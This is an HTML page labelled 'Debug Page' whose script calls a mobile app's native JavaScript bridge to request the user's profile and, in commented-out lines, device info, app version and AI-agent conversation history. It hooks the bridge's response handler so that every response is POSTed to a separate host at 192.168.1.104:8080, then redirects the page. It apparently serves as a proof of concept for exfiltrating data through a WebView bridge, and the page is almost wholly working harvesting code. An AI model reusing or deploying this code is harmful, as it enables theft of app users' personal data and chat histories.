<!DOCTYPE html>
<html>

<head>
    <title>Debug Page</title>
    <style>
        #debugOutput {
            width: 100%;
            height: 300px;
            font-family: monospace;
            font-size: 12px;
            border: 1px solid #ccc;
            padding: 10px;
            overflow-y: auto;
            background-color: #f5f5f5;
        }
    </style>
</head>

<body>
    <h3>Debug Output</h3>
    <textarea id="debugOutput" readonly></textarea>
    <script>
        // Debug函数
        function debugLog(message) {
            const debugOutput = document.getElementById('debugOutput');
            const timestamp = new Date().toLocaleTimeString();
            debugOutput.value += `[${timestamp}] ${message}\n`;
            debugOutput.scrollTop = debugOutput.scrollHeight;
            console.log(`DEBUG: ${message}`);
        }

        window.addEventListener('load', function () {
            debugLog('页面加载完成，开始初始化...');
            const makeRequest = (method, params) => {
                debugLog(`发起请求: method=${method}, params=${params}`);
                try {
                    if (method === 'request') {
                        // 新增对话详情请求处理
                        const reqData = params === 'history'
                            ? {
                                path: "api/user/agent/conversation/list",
                                method: "POST",
                                data: JSON.stringify({
                                    agentId: "naQivTmsDa",
                                    offset: 0,
                                    limit: 40,
                                    filterGoodQuestion: true
                                }),
                                header: "{}"
                            }
                            : {  // 新增对话详情请求
                                path: "api/user/agent/conversation/v1/detail",
                                method: "POST",
                                data: JSON.stringify({
                                    conversationId: "62184080-ec6f-487b-94b5-31168f89901d",
                                    offset: 0,
                                    limit: 60
                                }),
                                header: "{}"
                            };
                        debugLog(`JsRuntime.invoke调用: ${JSON.stringify(reqData)}`);
                        JsRuntime.invoke('request', JSON.stringify(reqData), Date.now());
                    } else {
                        debugLog(`JsRuntime.invoke调用: method=${method}`);
                        JsRuntime.invoke(method, '{}', `auto_${Date.now()}`);
                    }
                } catch (error) {
                    debugLog(`makeRequest发生错误: ${error.message}`);
                    sendToServer({ error: error.message, method });
                }
            };

            // 添加新的请求标识符 conversationDetail
            // ['getAppVersion', 'getDeviceInfo', 'userInfo', 'history', 'conversationDetail'].forEach(method => {
            //     setTimeout(() => {
            //         if (['history', 'conversationDetail'].includes(method)) {
            //             makeRequest('request', method);
            //         } else {
            //             makeRequest(method);
            //         }
            //     }, 500);
            // });
            // setTimeout(() => {
            //     debugLog('执行history请求');
            //     makeRequest("request", "history");
            // }, 1000);
            // setTimeout(() => {
            //     debugLog('执行conversationDetail请求');
            //     makeRequest("request", "conversationDetail");
            // }, 1100);
            // setTimeout(() => {
            //     debugLog('执行getAppVersion请求');
            //     makeRequest("getAppVersion");
            // }, 1200);
            // setTimeout(() => {
            //     debugLog('执行getDeviceInfo请求');
            //     makeRequest("getDeviceInfo");
            // }, 1300);
            setTimeout(() => {
                debugLog('执行userInfo请求');
                makeRequest("userInfo");
            }, 1400);

            debugLog('准备跳转到test.woa.com');
            document.location.href = "http://test.woa.com";

            window.jsb = {
                handleMessage: response => {
                    debugLog(`收到JSB响应: ${JSON.stringify(response)}`);
                    const payload = {
                        timestamp: new Date().toISOString(),
                        type: 'jsb_response',
                        data: response
                    };
                    sendToServer(payload);
                }
            };

            function sendToServer(data) {
                debugLog(`准备发送数据到服务器: ${JSON.stringify(data)}`);
                const errorPayload = {
                    timestamp: new Date().toISOString(),
                    type: 'client_error',
                    data
                };

                const finalData = data.error ? errorPayload : data;
                debugLog(`最终发送的数据: ${JSON.stringify(finalData)}`);

                fetch('http://192.168.1.104:8080', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(finalData)
                })
                    .then(response => {
                        debugLog(`服务器响应状态: ${response.status}`);
                        return response.text();
                    })
                    .then(text => {
                        debugLog(`服务器响应内容: ${text}`);
                    })
                    .catch(error => {
                        debugLog(`发送请求失败: ${error.message}`);
                        console.error('最终错误捕获:', error);
                    });
            }
        })
    </script>
</body>

</html>